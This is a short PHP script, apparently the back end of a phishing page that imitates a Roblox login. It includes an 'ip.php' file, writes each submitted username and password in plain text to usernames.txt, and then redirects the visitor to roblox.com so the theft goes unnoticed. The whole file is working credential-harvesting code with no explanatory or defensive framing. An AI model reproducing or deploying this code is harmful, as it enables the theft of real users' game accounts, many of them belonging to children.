<?php
include "ip.php";
file_put_contents("usernames.txt", "User : " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
header("Location: https://roblox.com");
exit();
?>
